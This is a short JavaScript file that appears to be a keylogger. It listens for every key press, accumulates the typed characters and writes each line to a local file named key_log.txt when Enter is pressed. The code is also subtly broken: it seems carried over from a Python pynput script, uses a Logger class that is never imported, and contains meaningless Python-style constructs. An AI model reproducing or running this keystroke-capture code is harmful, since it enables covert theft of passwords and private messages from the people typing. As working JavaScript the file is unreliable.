// Import the necessary libraries
const keyboard = require('keyboard');

// Initialize the log file
const logDir = '';

// Configure the logger
const logger = new Logger('key_log.txt');
logger.level = Logger.DEBUG;
logger.formatter = function(record) {
  return `[${record.date} ${record.level}] ${record.message}`;
};

// Initialize an empty string to store the typed string
let loggedString = '';

// Define the on-press callback function
function onPress(key) {
  // Declare the use of the global variable
  global.loggedString = loggedString;

  // Check if Enter key is pressed
  if (key === keyboard.Key.Enter) {
    // Check if there's a logged string
    if (loggedString) {
      // Log the accumulated string
      logger.info(loggedString);

      // Clear the accumulated string
      loggedString = '';
    }
  } else {
    // Try to get the character of the pressed key
    try {
      // Append the pressed key to the accumulated string
      loggedString += key.char;
    } catch (error) {
      // Handle non-character keys
      loggedString += ' ' + key + ' ';
    }
  }
}

// Start listening for keyboard events
keyboard.on('press', onPress);

// Wait for the listener to be stopped
keyboard.listen();
